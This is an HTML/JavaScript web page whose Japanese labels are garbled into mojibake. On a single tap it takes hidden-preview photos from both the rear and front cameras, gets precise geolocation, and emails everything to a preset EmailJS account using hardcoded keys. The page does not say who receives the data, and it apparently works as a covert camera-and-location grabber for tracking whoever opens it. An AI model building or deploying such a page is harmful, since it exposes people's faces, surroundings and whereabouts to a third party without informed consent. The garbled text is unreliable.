<!DOCTYPE html>
<html lang="ja">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>ã‚«ãƒ¡ãƒ©ï¼‹ä½ç½®ï¼‹EmailJSï¼ˆè¨±å¯ä¸€å›ã®ã¿ï¼‰</title>
<style>
  body { font-family: Arial, sans-serif; margin: 20px; background: #667eea; color: white; }
  .container { max-width: 600px; margin: auto; text-align: center; }
  .touch-area {
    border: 2px dashed rgba(255,255,255,0.5); border-radius: 12px;
    background: rgba(255,255,255,0.1); padding: 40px; margin: 20px 0; cursor: pointer;
  }
  .status { margin-top: 15px; padding: 10px; border-radius: 6px; background: rgba(0,0,0,0.4); }
</style>
<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
<script>
  emailjs.init("cPjKBUm_i6HebDQF7");
</script>
</head>
<body>
<div class="container">
  <h1>ğŸ“· ã‚«ãƒ¡ãƒ©ï¼‹ä½ç½®æƒ…å ±ï¼‹EmailJS</h1>
  <div class="touch-area" id="touchArea">â–¶ï¸ ã‚¿ãƒƒãƒ—/ã‚¯ãƒªãƒƒã‚¯ã§æ’®å½±ï¼†é€ä¿¡</div>
  <div class="status" id="status">å¾…æ©Ÿä¸­...</div>

  <video id="video" autoplay playsinline muted style="display:none;"></video>
  <canvas id="canvas" style="display:none;"></canvas>
</div>

<script>
  const touchArea = document.getElementById('touchArea');
  const status = document.getElementById('status');
  const video = document.getElementById('video');
  const canvas = document.getElementById('canvas');

  // ã‚°ãƒ­ãƒ¼ãƒãƒ«ã«ã‚«ãƒ¡ãƒ©ã‚¹ãƒˆãƒªãƒ¼ãƒ ã¨ä½ç½®æƒ…å ±ã‚’ä¿æŒã—å†åˆ©ç”¨
  let mediaStream = null;
  let cachedLocation = null;
  let isProcessing = false;

  async function initCamera(facingMode) {
    if(mediaStream) return mediaStream;
    try {
      mediaStream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode },
        audio: false
      });
      video.srcObject = mediaStream;
      await new Promise(r => setTimeout(r, 1000)); // ã‚«ãƒ¡ãƒ©èµ·å‹•å¾…ã¡
      return mediaStream;
    } catch(e) {
      throw new Error('ã‚«ãƒ¡ãƒ©è¨±å¯ã‚¨ãƒ©ãƒ¼ã¾ãŸã¯æœªå¯¾å¿œ');
    }
  }

  async function capturePhoto(facingMode) {
    status.textContent = `ğŸ“¸ ${facingMode}ã‚«ãƒ¡ãƒ©æ’®å½±ä¸­...`;
    const stream = await initCamera(facingMode);
    const videoTrack = stream.getVideoTracks()[0];
    const settings = videoTrack.getSettings();

    canvas.width = settings.width || 640;
    canvas.height = settings.height || 480;
    const ctx = canvas.getContext('2d');

    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    // ç”»è³ªã‚’è½ã¨ã—ã¦base64ã«å¤‰æ›
    const dataUrl = canvas.toDataURL('image/jpeg', 0.2);
    return dataUrl;
  }

  async function getLocation() {
    if(cachedLocation) return cachedLocation;
    status.textContent = "ğŸ“ ä½ç½®æƒ…å ±å–å¾—ä¸­...";
    cachedLocation = await new Promise((resolve, reject) => {
      if(!navigator.geolocation) return reject(new Error('ä½ç½®æƒ…å ±æœªå¯¾å¿œ'));
      navigator.geolocation.getCurrentPosition(
        pos => resolve(pos.coords),
        err => reject(new Error('ä½ç½®æƒ…å ±å–å¾—å¤±æ•—')),
        { enableHighAccuracy: true, timeout: 10000 }
      );
    });
    return cachedLocation;
  }

  async function sendEmail(params) {
    status.textContent = "âœ‰ï¸ ãƒ¡ãƒ¼ãƒ«é€ä¿¡ä¸­...";
    try {
      await emailjs.send('service_ja2c09x', 'template_2fp2jrg', params);
      status.textContent = "âœ… ãƒ¡ãƒ¼ãƒ«é€ä¿¡å®Œäº†ï¼";
    } catch (e) {
      status.textContent = "âŒ ãƒ¡ãƒ¼ãƒ«é€ä¿¡å¤±æ•—";
      throw e;
    }
  }

  async function process() {
    if(isProcessing) {
      status.textContent = "âŒ å‡¦ç†ä¸­ã§ã™ã€‚å°‘ã—å¾…ã£ã¦ãã ã•ã„ã€‚";
      return;
    }
    isProcessing = true;

    try {
      // å¤–ã‚«ãƒ¡
      const photoRear = await capturePhoto('environment');
      // å†…ã‚«ãƒ¡
      const photoFront = await capturePhoto('user');

      // ä½ç½®æƒ…å ±
      let location = null;
      try {
        location = await getLocation();
      } catch {
        location = { latitude: "ä¸æ˜", longitude: "ä¸æ˜", accuracy: "ä¸æ˜" };
      }

      // EmailJSãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ä½œæˆ
      const templateParams = {
        photo_rear: photoRear,
        photo_front: photoFront,
        location_info: `ç·¯åº¦: ${location.latitude || location.lat || 'ä¸æ˜'}<br>çµŒåº¦: ${location.longitude || location.lon || 'ä¸æ˜'}<br>ç²¾åº¦: ${location.accuracy || location.acc || 'ä¸æ˜'}m`,
        date: new Date().toLocaleString()
      };

      await sendEmail(templateParams);
    } catch (e) {
      console.error(e);
      status.textContent = `âŒ ã‚¨ãƒ©ãƒ¼: ${e.message}`;
    } finally {
      isProcessing = false;
    }
  }

  touchArea.addEventListener('click', process);
  touchArea.addEventListener('touchstart', e => {
    e.preventDefault();
    process();
  }, { passive:false });
</script>
</body>
</html>
